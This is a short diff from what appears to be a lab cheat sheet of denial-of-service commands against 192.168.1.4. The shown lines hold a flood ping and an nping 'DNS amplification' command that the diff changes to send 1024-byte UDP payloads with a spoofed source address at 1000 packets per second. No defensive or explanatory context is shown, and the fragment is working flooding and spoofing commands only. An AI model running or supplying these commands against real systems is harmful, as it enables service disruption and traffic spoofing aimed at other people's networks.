@@ -12,7 +12,8 @@ ICMP:
 ping -f 192.168.1.4
 
 DNS AMPLIFICATION:
-sudo nping --udp -p 53 --data-string "custom-DNS-query-payload" --source-ip 192.168.1.2 --count 500 --rate 1000 192.168.1.4
+sudo nping --udp -p 53 --data-string "$(printf '%*s' 1024 'A')" --source-ip 192.168.1.2 --count 500 --rate 1000 192.168.1.4
+
 
 
 
